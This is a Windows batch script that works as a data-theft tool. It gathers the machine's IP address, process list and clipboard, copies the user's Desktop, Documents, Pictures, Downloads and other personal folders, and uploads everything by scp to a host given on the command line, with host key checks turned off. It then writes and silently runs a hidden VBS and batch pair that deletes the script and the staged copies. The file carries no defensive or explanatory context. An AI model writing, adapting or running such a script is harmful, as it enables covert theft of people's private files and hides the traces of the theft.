@echo off
if "%~1"=="" (
    exit
) else (
    set "user=%~1"
)
if "%~2"=="" (
    exit
) else (
    set "host=%~2"
)
for /f "tokens=2-4 delims=/ " %%a in ('date /t') do (set mydate=%%c-%%a-%%b)
set copy=xcopy /s /c /d /e /h /i /r /g
set startDir=%cd%
:mkPCName
if exist "%cd%\%COMPUTERNAME%\" (
  goto mkUsrName
) else (
  mkdir "%cd%\%COMPUTERNAME%"
)
:mkUsrName
cd "%cd%\%COMPUTERNAME%"
if exist "%cd%\%USERNAME%\" (
  goto mkDateFolder
) else (
  mkdir "%cd%\%USERNAME%"
)
:mkDateFolder
cd "%cd%\%USERNAME%"
if exist "%cd%\%mydate%" (
  goto mkFilesFolder
) else (
  mkdir "%cd%\%mydate%"
)
:mkFilesFolder
cd "%cd%\%MYDATE%"
if exist "%cd%\files\" (
  goto start
) else (
  mkdir "%cd%\files"
)
:start
(
    for /F "tokens=14" %%A in ('"ipconfig | findstr IPv4"') do echo %%A
)> "ipaddr.txt"
tasklist > tasks.txt
powershell get-clipboard > clipboard.txt
cd %startDir%
scp -o StrictHostKeyChecking=no -r "%COMPUTERNAME%" %user%@%host%:/home/%user%/
cd "%COMPUTERNAME%\%USERNAME%\%MYDATE%\"
if exist "%USERPROFILE%\Desktop" ( %copy% "%USERPROFILE%\Desktop" "%cd%\files\Desktop" ) else if exist "%USERPROFILE%\OneDrive\Desktop" ( %copy% "%USERPROFILE%\OneDrive\Desktop" "%cd%\files\Desktop" )
scp -o StrictHostKeyChecking=no -r "%cd%\files\Desktop" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/
if exist "%USERPROFILE%\Pictures" ( %copy% "%USERPROFILE%\Pictures" "%cd%\files\Pictures" ) else if exist "%USERPROFILE%\OneDrive\Pictures" ( %copy% "%USERPROFILE%\OneDrive\Pictures" "%cd%\files\Pictures" )
scp -o StrictHostKeyChecking=no -r "%cd%\files\Pictures" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/
if exist "%USERPROFILE%\Documents" ( %copy% "%USERPROFILE%\Documents" "%cd%\files\Documents" ) else if exist "%USERPROFILE%\OneDrive\Documents" ( %copy% "%USERPROFILE%\OneDrive\Documents" "%cd%\files\Documents" )
scp -o StrictHostKeyChecking=no -r "%cd%\files\Documents" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/
if exist "%USERPROFILE%\Music" ( %copy% "%USERPROFILE%\Music" "%cd%\files\Music" ) else if exist "%USERPROFILE%\OneDrive\Music" ( %copy% "%USERPROFILE%\OneDrive\Music" "%cd%\files\Music" )
scp -o StrictHostKeyChecking=no -r "%cd%\files\Music" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/
if exist "%USERPROFILE%\Videos" ( %copy% "%USERPROFILE%\Videos" "%cd%\files\Videos" ) else if exist "%USERPROFILE%\OneDrive\Videos" ( %copy% "%USERPROFILE%\OneDrive\Videos" "%cd%\files\Videos" )
scp -o StrictHostKeyChecking=no -r "%cd%\files\Videos" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/
if exist "%USERPROFILE%\Downloads" ( %copy% "%USERPROFILE%\Downloads" "%cd%\files\Downloads" ) else if exist "%USERPROFILE%\OneDrive\Downloads" ( %copy% "%USERPROFILE%\OneDrive\Downloads" "%cd%\files\Downloads" )
scp -o StrictHostKeyChecking=no -r "%cd%\files\Downloads" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/
echo @echo off > "del%r%.bat"
echo del /q /f "run.vbs" > "del%r%.bat"
echo del /q /f "upload.bat" >> "del%r%.bat"
echo del /q /f /r "%COMPUTERNAME%" >> "del%r%.bat"
echo del /q /f "%%cd%%\%%~n0%%~x0" ^>nul 2^>^&1 ^& exit /b 0 >> "del%r%.bat"
echo Set objShell = WScript.CreateObject("WScript.Shell") > "run.vbs"
echo objShell.Run "%cd%\del%r%.bat", 0, True >> "run.vbs"
start run.vbs
exit